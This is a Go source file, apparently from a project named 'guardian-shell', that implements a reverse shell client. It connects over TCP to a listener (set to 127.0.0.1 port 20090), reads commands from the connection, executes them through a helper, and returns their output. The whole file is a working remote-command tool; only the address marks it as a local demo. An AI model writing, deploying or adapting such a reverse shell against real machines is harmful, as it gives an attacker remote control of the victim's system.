package main

import (
	"bufio"
	"fmt"
	"net"

	"github.com/avvvet/guardian-shell/internal/utils"
)

const (
	reverseIP   = "127.0.0.1"
	reversePort = 20090
)

func main() {
	address := fmt.Sprintf("%s:%d", reverseIP, reversePort)

	conn, err := net.Dial("tcp", address)
	if err != nil {
		fmt.Println("Error connecting to the reverse shell listner:", err)
		return
	}
	defer conn.Close()

	fmt.Println("Connected to the reverse guardian listern!")

	for {
		command, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			fmt.Println("Error reading command:", err)
			return
		}

		output, err := utils.ExecuteCommands(command)
		if err != nil {
			fmt.Println("Error executing command:", err)
		}

		//send command output to guardian listner
		fmt.Fprint(conn, output)
	}

}
